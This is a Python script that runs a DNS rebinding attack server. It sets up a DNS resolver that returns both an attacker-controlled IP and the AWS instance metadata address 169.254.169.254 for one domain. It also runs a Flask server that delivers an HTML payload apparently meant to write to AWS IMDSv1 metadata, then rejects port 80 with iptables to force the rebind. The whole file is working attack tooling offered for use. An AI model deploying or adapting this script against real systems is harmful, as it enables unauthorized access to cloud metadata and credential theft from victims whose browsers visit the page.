from dnslib.server import DNSServer, DNSLogger
from dnslib.dns import RR

HTTP_PORT = 80
DNS_PORT = 53
TCP = False

# Domain where your payload will be hosted, 
# and A records for the 2 below ips will be returned from
DOMAIN = "exploit.dynamic.h0.gs" 

# The IP address of the server side-binder is running on
HOST_IP = "3.83.114.20" 

# The IP address your payload is attempting to communicate with
ATTACK_IP = "169.254.169.254" 

# HTML file containing your payload
PAYLOAD_FILE = "aws-imdsv1-metadata-write.html" 

WAIT_TIME = 4 # Seconds to wait before closing port HTTP_PORT

class Resolver:
  def resolve(self, request, handler):
  	reply = request.reply()
  	# Add an A record for HOST_IP and ATTACK_IP
  	reply.add_answer(*RR.fromZone("{}. 10 A {}".format(DOMAIN, HOST_IP)))
  	reply.add_answer(*RR.fromZone("{}. 10 A {}".format(DOMAIN, ATTACK_IP)))
  	return reply

resolver = Resolver()
logger = DNSLogger(prefix=False)
# Start DNS Server on UDP port DNS_PORT
server = DNSServer(resolver, port=DNS_PORT, address="0.0.0.0", logger=logger, tcp=TCP)
server.start_thread()


from flask import Flask
import threading, time, subprocess, atexit

# Block port HTTP_PORT
def close_firewall():
  print('\tWaiting {} before blocking port {}...'.format(str(WAIT_TIME), str(HTTP_PORT)))
  time.sleep(WAIT_TIME)
  command = "iptables -A INPUT -p tcp --destination-port {} -j REJECT --reject-with tcp-reset".format(str(HTTP_PORT))
  print("\tRunning `{}`".format(command))
  p = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE)
  output, error = p.communicate()
  if error is not None:
  	print(error)
  print('\tPort {} blocked'.format(str(HTTP_PORT)))

# Re-open port HTTP_PORT
def open_firewall():
  print('\tUnblocking port {} and exiting.'.format(str(HTTP_PORT)))
  command = "iptables -D INPUT -p tcp --destination-port {} -j REJECT --reject-with tcp-reset".format(str(HTTP_PORT))
  print("\tRunning `{}`".format(command))
  p = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE)
  output, error = p.communicate()
  if error is not None:
  	print(error)

app = Flask(__name__, static_folder='./payloads/')

# Serve payload from PAYLOAD_FILE on HTTP_PORT
@app.route('/')
def payload():
    t = threading.Thread(target=close_firewall)
    t.start()
    return app.send_static_file(PAYLOAD_FILE)

if __name__ == '__main__':
  # Catch exits and re-open port HTTP_PORT
  atexit.register(open_firewall)
  app.run(host='0.0.0.0', port=HTTP_PORT)
